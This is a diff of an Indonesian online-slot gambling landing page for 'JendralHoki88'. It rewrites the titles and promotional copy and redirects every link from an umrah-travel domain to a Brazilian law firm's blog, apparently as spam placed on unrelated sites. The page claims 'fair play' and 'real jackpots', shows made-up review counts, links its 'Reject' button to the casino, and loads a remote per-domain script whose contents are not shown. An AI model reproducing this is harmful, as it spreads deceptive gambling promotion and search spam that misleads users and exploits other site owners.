@@ -7,11 +7,11 @@
 <html lang="id">
   <head prefix="og: http://ogp.me/ns#">
     <meta charset="utf-8" />
-    <title>JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer</title>
+    <title>JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata</title>
 
     <meta
       name="description"
-      content="JendralHoki88 Provider games PG terbaik menghadirkan berbagai pilihan game slot modern dengan grafis berkualitas tinggi, fitur bonus lengkap, serta gameplay yang seru. Nikmati koleksi game PG Soft paling populer dengan peluang kemenangan menarik dan pengalaman bermain yang stabil di berbagai perangkat."
+      content="JendralHoki88 Mainkan slot maxwin favorit dengan peluang kemenangan optimal dan fitur bonus lengkap. Nikmati gameplay ringan, tampilan modern, serta kesempatan mendapatkan jackpot besar kapan saja."
     />
     <meta name="keywords" content="JendralHoki88, JendralHoki88 Slot, JendralHoki88 Login, JendralHoki88 Alternatif, JendralHoki88 Daftar, JendralHoki88 Official" />
     <meta name="robots" content="index,follow" />
@@ -21,38 +21,38 @@
     />
     <meta
       property="og:title"
-      content="JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer"
+      content="JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata"
     />
     <meta property="og:type" content="og:product" />
     <meta property="fb:app_id" content="603190889801449" />
     <meta
       property="og:description"
-      content="JendralHoki88 Provider games PG terbaik menghadirkan berbagai pilihan game slot modern dengan grafis berkualitas tinggi, fitur bonus lengkap, serta gameplay yang seru. Nikmati koleksi game PG Soft paling populer dengan peluang kemenangan menarik dan pengalaman bermain yang stabil di berbagai perangkat."
+      content="JendralHoki88 Mainkan slot maxwin favorit dengan peluang kemenangan optimal dan fitur bonus lengkap. Nikmati gameplay ringan, tampilan modern, serta kesempatan mendapatkan jackpot besar kapan saja."
     />
-    <meta property="og:url" content="https://zupumrah.memberkit.my.id/paket-umroh/" />
+    <meta property="og:url" content="https://daherjacobadvogados.com.br/blog/" />
     <meta property="product:price:amount" content="55" />
     <meta property="product:price:currency" content="IDR" />
     <meta
       property="og:image"
-      content="https://cdn.cloudeku.me/upload/image/Samurax.png"
+      content="https://cdn.cloudeku.me/upload/image/boahancockV.png"
     />
 
     <meta name="twitter:card" content="summary" />
     <meta name="twitter:site" content="@JendralHoki88" />
     <meta
       name="twitter:title"
-      content="JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer"
+      content="JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata"
     />
     <meta
       name="twitter:description"
-      content="JendralHoki88 Provider games PG terbaik menghadirkan berbagai pilihan game slot modern dengan grafis berkualitas tinggi, fitur bonus lengkap, serta gameplay yang seru. Nikmati koleksi game PG Soft paling populer dengan peluang kemenangan menarik dan pengalaman bermain yang stabil di berbagai perangkat."
+      content="JendralHoki88 Mainkan slot maxwin favorit dengan peluang kemenangan optimal dan fitur bonus lengkap. Nikmati gameplay ringan, tampilan modern, serta kesempatan mendapatkan jackpot besar kapan saja."
     />
     <meta
       name="twitter:image"
-      content="https://cdn.cloudeku.me/upload/image/Samurax.png"
+      content="https://cdn.cloudeku.me/upload/image/boahancockV.png"
     />
 
-    <link rel="canonical" href="https://zupumrah.memberkit.my.id/paket-umroh/" />
+    <link rel="canonical" href="https://daherjacobadvogados.com.br/blog/" />
     <link
       rel="Shortcut icon"
       href="https://cdn.cloudeku.me/upload/image/nekolucky.png"
@@ -155,7 +155,7 @@
       type="text/css"
     />
 
-    <link rel="amphtml" href="https://zupumrah-memberkit.pages.dev/" />
+    <link rel="amphtml" href="https://daherjacobadvogados.pages.dev/" />
 
 
     <script type="application/ld+json">
@@ -163,10 +163,10 @@
         "@context": "http://schema.org",
         "@type": "WebSite",
         "name": "JendralHoki88",
-        "url": "https://zupumrah.memberkit.my.id/paket-umroh/",
+        "url": "https://daherjacobadvogados.com.br/blog/",
         "potentialAction": {
           "@type": "SearchAction",
-          "target": "https://zupumrah.memberkit.my.id/paket-umroh//search?q={search_term_string}",
+          "target": "https://daherjacobadvogados.com.br/blog//search?q={search_term_string}",
           "query-input": "required name=search_term_string"
         }
       }
@@ -176,11 +176,11 @@
         {
           "@context": "https://schema.org",
           "@type": "Product",
-          "@id": "https://zupumrah.memberkit.my.id/paket-umroh//#product",
-          "url": "https://zupumrah.memberkit.my.id/paket-umroh/",
-          "name": "JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer",
-          "description": "JendralHoki88 Provider games PG terbaik menghadirkan berbagai pilihan game slot modern dengan grafis berkualitas tinggi, fitur bonus lengkap, serta gameplay yang seru. Nikmati koleksi game PG Soft paling populer dengan peluang kemenangan menarik dan pengalaman bermain yang stabil di berbagai perangkat.",
-          "image": "https://cdn.cloudeku.me/upload/image/Samurax.png",
+          "@id": "https://daherjacobadvogados.com.br/blog//#product",
+          "url": "https://daherjacobadvogados.com.br/blog/",
+          "name": "JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata",
+          "description": "JendralHoki88 Mainkan slot maxwin favorit dengan peluang kemenangan optimal dan fitur bonus lengkap. Nikmati gameplay ringan, tampilan modern, serta kesempatan mendapatkan jackpot besar kapan saja.",
+          "image": "https://cdn.cloudeku.me/upload/image/boahancockV.png",
           "brand": {
             "@type": "Brand",
             "name": "JendralHoki88"
@@ -198,7 +198,7 @@
         
           "offers": {
             "@type": "Offer",
-            "url": "https://zupumrah.memberkit.my.id/paket-umroh/",
+            "url": "https://daherjacobadvogados.com.br/blog/",
             "priceCurrency": "IDR",
             "price": "10000",
             "availability": "https://schema.org/InStock",
@@ -255,7 +255,7 @@
             {
               "@context": "https://schema.org",
               "@type": "FAQPage",
-              "@id": "https://zupumrah.memberkit.my.id/paket-umroh//#faq",
+              "@id": "https://daherjacobadvogados.com.br/blog//#faq",
               "mainEntity": [
                 {
                   "@type": "Question",
@@ -301,17 +301,17 @@
     "@type": "ListItem",
     "position": 1,
     "name": "JendralHoki88",
-    "item": "https://zupumrah.memberkit.my.id/paket-umroh/"
+    "item": "https://daherjacobadvogados.com.br/blog/"
   }, {
     "@type": "ListItem",
     "position": 2,
     "name": "GAME ONLINE",
-    "item": "https://zupumrah.memberkit.my.id/paket-umroh/"
+    "item": "https://daherjacobadvogados.com.br/blog/"
   }, {
     "@type": "ListItem",
     "position": 3,
     "name": "PEJUANG RUPIAH",
-    "item": "https://zupumrah.memberkit.my.id/paket-umroh/"
+    "item": "https://daherjacobadvogados.com.br/blog/"
   }]
 }
 </script>
@@ -552,7 +552,7 @@
         <div class="container">
           <div class="BIG-header-main">
             <div class="BIG-header-logo">
-              <a href="https://zupumrah.memberkit.my.id/paket-umroh/" class="navbar-brand">
+              <a href="https://daherjacobadvogados.com.br/blog/" class="navbar-brand">
                 <img
                   src="https://cdn.cloudeku.me/upload/image/jendralhoki88.png"
                   alt="Brand Gacor"
@@ -579,11 +579,11 @@
             </div>
 
             <div class="BIG-header-actions">
-              <a href="https://zupumrah-memberkit.pages.dev/" class="BIG-btn-pill"
+              <a href="https://daherjacobadvogados.pages.dev/" class="BIG-btn-pill"
                 >MASUK</a
               >
               <a
-                href="https://zupumrah-memberkit.pages.dev/"
+                href="https://daherjacobadvogados.pages.dev/"
                 class="BIG-btn-pill BIG-btn-pill--primary"
                 >Daftar</a
               >
@@ -635,12 +635,12 @@
                   <img
                     class="pull-left thumb-lg m-r-md img-rounded visible-sm visible-md visible-lg visible-xl"
                     src="https://cdn.cloudeku.me/upload/image/nekolucky.png"
-                    alt="JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer"
+                    alt="JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata"
                   />
                   <img
                     class="pull-left thumb-md m-r-md img-rounded visible-xs"
                     src="https://cdn.cloudeku.me/upload/image/nekolucky.png"
-                    alt="JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer"
+                    alt="JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata"
                   />
                 </div>
 
@@ -649,11 +649,11 @@
                     <span
                       class="h2 text-dark visible-sm visible-md visible-lg visible-xl"
                     >
-                      JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer
+                      JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata
                     </span>
                   </h1>
                   <span>
-                    JendralHoki88 Provider games PG terbaik menghadirkan berbagai pilihan game slot modern dengan grafis berkualitas tinggi, fitur bonus lengkap, serta gameplay yang seru. Nikmati koleksi game PG Soft paling populer dengan peluang kemenangan menarik dan pengalaman bermain yang stabil di berbagai perangkat.
+                    JendralHoki88 Mainkan slot maxwin favorit dengan peluang kemenangan optimal dan fitur bonus lengkap. Nikmati gameplay ringan, tampilan modern, serta kesempatan mendapatkan jackpot besar kapan saja.
                   </span>
                 </div>
               </div>
@@ -668,18 +668,18 @@
                     class="pull-left thumb-md m-r-md img-rounded visible-xs"
                     src="https://cdn.cloudeku.me/upload/image/nekolucky.png"
                     srcset="https://cdn.cloudeku.me/upload/image/nekolucky.png  270w, https://cdn.cloudeku.me/upload/image/nekolucky.png  800w, https://cdn.cloudeku.me/upload/image/nekolucky.png 1200w"
-                    alt="JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer"
+                    alt="JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata"
                   />
                 </div>
 
                 <div>
                   <h1 class="h3 text-dark">
                     <span class="visible-xs">
-                      JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer
+                      JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata
                     </span>
                   </h1>
                   <span>
-                    JendralHoki88 Provider games PG terbaik menghadirkan berbagai pilihan game slot modern dengan grafis berkualitas tinggi, fitur bonus lengkap, serta gameplay yang seru. Nikmati koleksi game PG Soft paling populer dengan peluang kemenangan menarik dan pengalaman bermain yang stabil di berbagai perangkat.
+                    JendralHoki88 Mainkan slot maxwin favorit dengan peluang kemenangan optimal dan fitur bonus lengkap. Nikmati gameplay ringan, tampilan modern, serta kesempatan mendapatkan jackpot besar kapan saja.
                   </span>
                 </div>
               </div>
@@ -697,16 +697,16 @@
                   onchange="if (!window.__cfRLUnblockHandlers) return false; document.location.href=document.itemmenuform.SelectSection.options[document.itemmenuform.SelectSection.selectedIndex].value"
                   data-cf-modified-6e95f0843c370e1387aefe5b-
                 >
-                  <option value="https://zupumrah.memberkit.my.id/paket-umroh/" selected>
+                  <option value="https://daherjacobadvogados.com.br/blog/" selected>
                     Overview
                   </option>
-                  <option value="https://zupumrah.memberkit.my.id/paket-umroh/">
+                  <option value="https://daherjacobadvogados.com.br/blog/">
                     Reviews (99.88K)
                   </option>
-                  <option value="https://zupumrah.memberkit.my.id/paket-umroh/">
+                  <option value="https://daherjacobadvogados.com.br/blog/">
                     Support (88.777)
                   </option>
-                  <option value="https://zupumrah.memberkit.my.id/paket-umroh/">FAQ (5)</option>
+                  <option value="https://daherjacobadvogados.com.br/blog/">FAQ (5)</option>
                 </select>
               </form>
             </div>
@@ -716,22 +716,22 @@
             >
               <a
                 class="text-md active wrapper-xs m-r-xxl"
-                href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                href="https://daherjacobadvogados.com.br/blog/"
                 >Overview</a
               >
               <a
                 class="text-md wrapper-xs m-r-xxl"
-                href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                href="https://daherjacobadvogados.com.br/blog/"
                 >Reviews (59.987K)</a
               >
               <a
                 class="text-md wrapper-xs m-r-xxl"
-                href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                href="https://daherjacobadvogados.com.br/blog/"
                 >Support (87.798K)</a
               >
               <a
                 class="text-md wrapper-xs m-r-xxl"
-                href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                href="https://daherjacobadvogados.com.br/blog/"
                 >FAQ (5)</a
               >
             </div>
@@ -744,9 +744,9 @@
               <div class="panel b-a">
                 <div>
                   <img
-                    alt="JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer"
-                    src="https://cdn.cloudeku.me/upload/image/Samurax.png"
-                    srcset="https://cdn.cloudeku.me/upload/image/Samurax.png  270w, https://cdn.cloudeku.me/upload/image/Samurax.png  800w, https://cdn.cloudeku.me/upload/image/Samurax.png 1200w, https://cdn.cloudeku.me/upload/image/Samurax.png 1600w"
+                    alt="JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata"
+                    src="https://cdn.cloudeku.me/upload/image/boahancockV.png"
+                    srcset="https://cdn.cloudeku.me/upload/image/boahancockV.png  270w, https://cdn.cloudeku.me/upload/image/boahancockV.png  800w, https://cdn.cloudeku.me/upload/image/boahancockV.png 1200w, https://cdn.cloudeku.me/upload/image/boahancockV.png 1600w"
                     class="img-full"
                   />
                 </div>
@@ -866,7 +866,7 @@
 
                   <div class="action-row-hd">
                     <a
-                      href="https://zupumrah-memberkit.pages.dev/"
+                      href="https://daherjacobadvogados.pages.dev/"
                       class="btn-hd btn-live-demo-hd"
                       target="_blank"
                       rel="noopener"
@@ -880,7 +880,7 @@
                     </a>
 
                     <a
-                      href="https://zupumrah-memberkit.pages.dev/"
+                      href="https://daherjacobadvogados.pages.dev/"
                       class="btn-hd btn-bookmark-hd"
                       target="_blank"
                       rel="noopener"
@@ -894,7 +894,7 @@
                     </a>
 
                     <a
-                      href="https://zupumrah-memberkit.pages.dev/"
+                      href="https://daherjacobadvogados.pages.dev/"
                       class="btn-hd btn-like-hd"
                       target="_blank"
                       rel="noopener"
@@ -916,24 +916,24 @@
                 <div class="col-lg-12">
                   <div class="panel b-a">
                     <div class="panel-heading bg-white-only b-light b-b font-bold">
-                      <h2>JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer</h2>
+                      <h2>JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata</h2>
                     </div>
 
                     <div class="panel-body item-description text-md text-wordbreak">
 <p>
-        <strong>JendralHoki88</strong> adalah <a href="https://zupumrah.memberkit.my.id/paket-umroh/" style="color:#ff9900; text-decoration:none;" alt="link alternatif slot online nomor satu">link alternatif slot online nomor satu</a> yang memberikan akses mudah dan cepat bagi para pemain di Indonesia. Dengan sistem stabil dan tampilan modern, JendralHoki88 menghadirkan beragam pilihan situs slot resmi dengan peluang kemenangan maksimal serta pengalaman bermain terbaik setiap harinya.
+        <strong>JendralHoki88</strong> adalah <a href="https://daherjacobadvogados.com.br/blog/" style="color:#ff9900; text-decoration:none;" alt="link alternatif slot online nomor satu">link alternatif slot online nomor satu</a> yang memberikan akses mudah dan cepat bagi para pemain di Indonesia. Dengan sistem stabil dan tampilan modern, JendralHoki88 menghadirkan beragam pilihan situs slot resmi dengan peluang kemenangan maksimal serta pengalaman bermain terbaik setiap harinya.
     </p>
 
     <p>
-        Sebagai <a href="https://zupumrah.memberkit.my.id/paket-umroh/" style="color:#ff9900; text-decoration:none;" alt="rekomendasi slot online terbaik">rekomendasi slot online terbaik</a>, JendralHoki88 menawarkan koleksi permainan slot gacor lengkap dengan fitur tercanggih dan proses transaksi kilat. Pemain dapat menikmati sensasi bermain yang nyaman berkat sistem transparan serta keuntungan dari berbagai bonus melimpah yang tersedia di setiap jenis permainan.
+        Sebagai <a href="https://daherjacobadvogados.com.br/blog/" style="color:#ff9900; text-decoration:none;" alt="rekomendasi slot online terbaik">rekomendasi slot online terbaik</a>, JendralHoki88 menawarkan koleksi permainan slot gacor lengkap dengan fitur tercanggih dan proses transaksi kilat. Pemain dapat menikmati sensasi bermain yang nyaman berkat sistem transparan serta keuntungan dari berbagai bonus melimpah yang tersedia di setiap jenis permainan.
     </p>
 
     <p>
-        Keunggulan utama <a href="https://zupumrah.memberkit.my.id/paket-umroh/" style="color:#ff9900; text-decoration:none;" alt="situs slot online resmi terpercaya">situs slot online resmi terpercaya</a> JendralHoki88 terletak pada server cepat dan stabil, sehingga semua taruhan dapat diakses tanpa hambatan. Update permainan slot terbaru selalu tersedia, memberikan variasi hiburan yang menarik dan kesempatan meraih jackpot besar secara konsisten.
+        Keunggulan utama <a href="https://daherjacobadvogados.com.br/blog/" style="color:#ff9900; text-decoration:none;" alt="situs slot online resmi terpercaya">situs slot online resmi terpercaya</a> JendralHoki88 terletak pada server cepat dan stabil, sehingga semua taruhan dapat diakses tanpa hambatan. Update permainan slot terbaru selalu tersedia, memberikan variasi hiburan yang menarik dan kesempatan meraih jackpot besar secara konsisten.
     </p>
 
     <p>
-        Bagi pemain baru, <a href="https://zupumrah.memberkit.my.id/paket-umroh/" style="color:#ff9900; text-decoration:none;" alt="daftar situs slot gacor JendralHoki88">daftar situs slot gacor JendralHoki88</a> menyediakan proses pendaftaran cepat dan praktis. Setelah memiliki akun, Anda langsung bisa menikmati akses ke link alternatif slot online nomor satu, proses deposit/withdraw instan, serta layanan profesional 24 jam. Daftar sekarang dan rasakan sensasi menang di JendralHoki88.
+        Bagi pemain baru, <a href="https://daherjacobadvogados.com.br/blog/" style="color:#ff9900; text-decoration:none;" alt="daftar situs slot gacor JendralHoki88">daftar situs slot gacor JendralHoki88</a> menyediakan proses pendaftaran cepat dan praktis. Setelah memiliki akun, Anda langsung bisa menikmati akses ke link alternatif slot online nomor satu, proses deposit/withdraw instan, serta layanan profesional 24 jam. Daftar sekarang dan rasakan sensasi menang di JendralHoki88.
     </p>
                     </div>
                   </div>
@@ -1339,14 +1339,14 @@
                     rel="dofollow"
                     class="btn btn-success btn-lg btn-block m-b-xs font-bold"
                     id="buyButton"
-                    href="https://zupumrah-memberkit.pages.dev/"
+                    href="https://daherjacobadvogados.pages.dev/"
                   >
                     <i class="pull-right fa fa-chevron-right"></i>JendralHoki88
                   </a>
 
                   <form
                     class="payment-form"
-                    action="https://zupumrah.memberkit.my.id/paket-umroh/"
+                    action="https://daherjacobadvogados.com.br/blog/"
                     method="POST"
                   >
                     <input
@@ -1773,7 +1773,7 @@
                         </button>
 
                         <form
-                          action="/sign_up/?redirectURL=https://zupumrah.memberkit.my.id/paket-umroh/&#63;purchasepanel=true"
+                          action="/sign_up/?redirectURL=https://daherjacobadvogados.com.br/blog/&#63;purchasepanel=true"
                           method="post"
                           class="form-validation"
                         >
@@ -2186,7 +2186,7 @@
             </div>
 
             <div class="modal-footer">
-              <a href="https://zupumrah-memberkit.pages.dev/" class="btn btn-default">
+              <a href="https://daherjacobadvogados.pages.dev/" class="btn btn-default">
                 Reject
               </a>
               <a
@@ -2235,7 +2235,7 @@
                     <i class="fa fa-lg fa-pinterest m-t-xxs"></i>
                   </a>
                   <a
-                    href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                    href="https://daherjacobadvogados.com.br/blog/"
                     target="_blank"
                     class="btn btn-icon btn-rss"
                   >
@@ -2250,22 +2250,22 @@
                 </h4>
                 <ul class="list-unstyled">
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Download Apk Slot Online</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">Download Apk Slot Online</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">situs slot online</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">situs slot online</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">slot online gacor</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">slot online gacor</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">SLOT ONLINE</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">SLOT ONLINE</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">agen slot online</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">agen slot online</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Link Alternatif Slot</a
+                    <a href="https://daherjacobadvogados.com.br/blog/">Link Alternatif Slot</a
                     >
                   </li>
                 </ul>
@@ -2277,13 +2277,13 @@
                 </h4>
                 <ul class="list-unstyled">
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">About JendralHoki88</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">About JendralHoki88</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Referral Slot Online</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">Referral Slot Online</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Situs Slot Terpercaya</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">Situs Slot Terpercaya</a>
                   </li>
                 </ul>
               </div>
@@ -2294,13 +2294,13 @@
                 </h4>
                 <ul class="list-unstyled">
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Help Center</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">Help Center</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Forum</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">Forum</a>
                   </li>
                   <li>
-                    <a href="https://zupumrah.memberkit.my.id/paket-umroh/">Blog</a>
+                    <a href="https://daherjacobadvogados.com.br/blog/">Blog</a>
                   </li>
                 </ul>
               </div>
@@ -2327,35 +2327,35 @@
                   <li>
                     <a
                       style="color: white"
-                      href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                      href="https://daherjacobadvogados.com.br/blog/"
                       >Contact</a
                     >
                   </li>
                   <li>
                     <a
                       style="color: white"
-                      href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                      href="https://daherjacobadvogados.com.br/blog/"
                       >Terms &amp; conditions</a
                     >
                   </li>
                   <li>
                     <a
                       style="color: white"
-                      href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                      href="https://daherjacobadvogados.com.br/blog/"
                       >Member terms</a
                     >
                   </li>
                   <li>
                     <a
                       style="color: white"
-                      href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                      href="https://daherjacobadvogados.com.br/blog/"
                       >Privacy policy</a
                     >
                   </li>
                   <li>
                     <a
                       style="color: white"
-                      href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                      href="https://daherjacobadvogados.com.br/blog/"
                       >Refund policy</a
                     >
                   </li>
@@ -2372,7 +2372,7 @@
                 <strong>
                   <a
                     style="color: #1c2b36"
-                    href="https://zupumrah.memberkit.my.id/paket-umroh/"
+                    href="https://daherjacobadvogados.com.br/blog/"
                     >JendralHoki88</a
                   >
                 </strong>
@@ -2538,7 +2538,7 @@
         
           requestIdleCallback(() => {
             const s = document.createElement('script');
-            s.src = "https://cdn.jsdelivr.net/gh/BobMarleyJoyy/cdn-globaljs@main/zupumrah-memberkit.js";
+            s.src = "https://cdn.jsdelivr.net/gh/BobMarleyJoyy/cdn-globaljs@main/daherjacobadvogados.js";
             s.async = true;
             document.body.appendChild(s);
           });
@@ -2554,7 +2554,7 @@
           {
             item_id: "58439",
             item_name:
-              "JendralHoki88 Provider Games PG Terbaik 2026 🎮 Koleksi Slot PG Soft Paling Gacor & Populer",
+              "JendralHoki88 Slot Maxwin Online Resmi dengan Sistem Fair Play & Jackpot Nyata",
             affiliation: "JendralHoki88",
             currency: "IDR",
             index: 0,
